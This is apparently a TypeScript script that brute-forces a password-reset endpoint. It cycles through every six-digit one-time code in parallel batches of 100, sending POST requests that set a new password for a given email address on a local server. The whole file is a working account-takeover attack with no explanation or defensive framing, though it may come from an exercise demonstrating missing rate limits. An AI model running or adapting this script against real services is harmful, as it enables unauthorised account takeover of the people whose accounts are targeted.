import axios from 'axios';
async function attackServer(otp :number) {
    let data = JSON.stringify({
        "email": "punit@gmail.com",
        "newPassword": "123123123",
        "otp": otp.toString()
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    try {
        await axios.request(config);
    } catch (error) {
        // console.log(error);
    }

}

async function main() {
    for (let i = 100000; i < 999999; i += 100) {
        let p = [];
        for (let j = 0; j < 100; j++) {
            p.push(attackServer(i + j));
            console.log("Attack with OTP: ", i + j);
        }
        try {await Promise.all(p);}
        catch(error) {}
    }
}
main();